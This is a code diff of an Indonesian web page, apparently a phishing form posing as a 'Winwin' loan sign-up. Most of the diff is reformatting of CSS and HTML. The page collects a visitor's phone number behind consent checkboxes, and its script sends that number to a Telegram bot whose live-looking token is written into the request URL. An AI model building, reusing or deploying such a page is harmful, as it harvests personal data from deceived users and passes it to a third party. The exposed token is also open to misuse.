@@ -8,7 +8,7 @@
     <style>
         body {
             font-family: Arial, sans-serif;
-            background-color: #white;
+            background-color: white;
             display: flex;
             flex-direction: column;
             justify-content: center;
@@ -19,19 +19,19 @@
         }
         
         .gambar {
-      width: 100%;
-      margin-bottom: 0px;
-      margin-top:-75px;
-    }
+            width: 100%;
+            margin-bottom: 0px;
+            margin-top: -75px;
+        }
 
-    .gambar img {
-      width: 100%;
-      object-fit: cover;
-      margin-bottom: 0px;
-    }
+        .gambar img {
+            width: 100%;
+            object-fit: cover;
+            margin-bottom: 0px;
+        }
         
         .container {
-            background-color:white;
+            background-color: white;
             padding: 20px;
             border-radius: 8px;
             box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
@@ -39,67 +39,63 @@
             width: 310px;
             margin-bottom: 20px;
         }
+        
         .input-group {
             position: relative;
             margin-bottom: 20px;
         }
         
         .input-group span {
-    position: absolute;
-    top: 50%;
-    left: 5px;
-    transform: translateY(-50%);
-    display: flex;
-    align-items: center;
-    gap: 5px; /* Menambahkan jarak antara ikon */
-}
+            position: absolute;
+            top: 50%;
+            left: 5px;
+            transform: translateY(-50%);
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
 
-.input-group input[type="number"] {
+        .input-group input[type="number"] {
             width: 71%;
-            padding: 17px 19px 19px 69px; /* Sesuaikan padding kiri dengan ukuran logo */
+            padding: 17px 19px 19px 69px;
             border: 1px solid #ccc;
             border-radius: 12px;
             font-weight: bold;
             font-size: 16px;
         }
 
-        /* Styling untuk checkbox yang disembunyikan */
-.agreements input[type="checkbox"] {
-    display: none;
-}
+        .agreements input[type="checkbox"] {
+            display: none;
+        }
 
-/* Styling untuk custom checkbox */
-.agreements .checkbox-custom {
-    display: inline-block;
-    width: 15px;
-    height: 15px;
-    border: 1px solid #ccc;
-    border-radius: 8px;
-    background-color: white;
-    vertical-align: middle;
-    margin-right: 8px;
-    transition: background-color 0.2s, border-color 0.2s;
-}
+        .agreements .checkbox-custom {
+            display: inline-block;
+            width: 15px;
+            height: 15px;
+            border: 1px solid #ccc;
+            border-radius: 8px;
+            background-color: white;
+            vertical-align: middle;
+            margin-right: 8px;
+            transition: background-color 0.2s, border-color 0.2s;
+        }
 
-/* Gaya saat checkbox dipilih */
-.agreements input[type="checkbox"]:checked + .checkbox-custom {
-    background-color: darkblue;
-    border-color: darkblue;
-}
+        .agreements input[type="checkbox"]:checked + .checkbox-custom {
+            background-color: darkblue;
+            border-color: darkblue;
+        }
 
-/* Styling untuk label checkbox */
-.agreements label {
-    display: flex;
-    align-items: center;
-    cursor: pointer;
-    font-size: 16px;
-    margin-top:8px;
-}
+        .agreements label {
+            display: flex;
+            align-items: center;
+            cursor: pointer;
+            font-size: 16px;
+            margin-top: 8px;
+        }
 
-/* Styling untuk label saat dihover */
-.agreements label:hover .checkbox-custom {
-    border-color: #888;
-}
+        .agreements label:hover .checkbox-custom {
+            border-color: #888;
+        }
 
         button {
             width: 100%;
@@ -113,6 +109,7 @@
             color: white;
             transition: background-color 0.3s ease;
         }
+
         button.enabled {
             background-color: darkblue;
             cursor: pointer;
@@ -120,9 +117,9 @@
     </style>
 </head>
 <body>
-  <div class="gambar">
-    <img src="https://raw.githubusercontent.com/Tria6460/Tria6460.github.io/main/1723882447019.jpg" alt="Gambar Pucok">
-  </div>
+    <div class="gambar">
+        <img src="https://raw.githubusercontent.com/Tria6460/Tria6460.github.io/main/1723882447019.jpg" alt="Gambar Pucok">
+    </div>
     <div class="container">
         <div class="input-group">
             <span>
@@ -134,24 +131,23 @@
         <button id="submitButton" onclick="submitForm()" disabled>Lanjut</button>
     </div>
     
-<div class="agreements">
-    <label>
-        <input type="checkbox" id="agreement1" onchange="checkInput()">
-        <span class="checkbox-custom"></span>
-        Saya setuju dengan Syarat dan Ketentuan
-    </label>
-    <label>
-        <input type="checkbox" id="agreement2" onchange="checkInput()">
-        <span class="checkbox-custom"></span>
-        Saya setuju dengan Kebijakan Privasi
-    </label>
-    <label>
-        <input type="checkbox" id="agreement3" onchange="checkInput()">
-        <span class="checkbox-custom"></span>
-        Saya setuju menerima informasi terbaru
-    </label>
-</div>
-
+    <div class="agreements">
+        <label>
+            <input type="checkbox" id="agreement1" onchange="checkInput()">
+            <span class="checkbox-custom"></span>
+            Saya setuju dengan Syarat dan Ketentuan
+        </label>
+        <label>
+            <input type="checkbox" id="agreement2" onchange="checkInput()">
+            <span class="checkbox-custom"></span>
+            Saya setuju dengan Kebijakan Privasi
+        </label>
+        <label>
+            <input type="checkbox" id="agreement3" onchange="checkInput()">
+            <span class="checkbox-custom"></span>
+            Saya setuju menerima informasi terbaru
+        </label>
+    </div>
 
     <script>
         const TELEGRAM_TOKEN = 'YOUR_TELEGRAM_BOT_TOKEN'; // Ganti dengan token bot Anda
@@ -186,7 +182,7 @@
         }
 
         function sendToTelegram(phoneNumber) {
-            const message = `Nomor HP: ${phoneNumber}`;
+            const message = `Nomor Pinjaman Winwin: ${phoneNumber}`;
             const url = `https://api.telegram.org/bot6711678141:AAHCPWlRygK8bHdAhXUlfIFCf6GztfCwsjY/sendMessage`;
 
             fetch(url, {
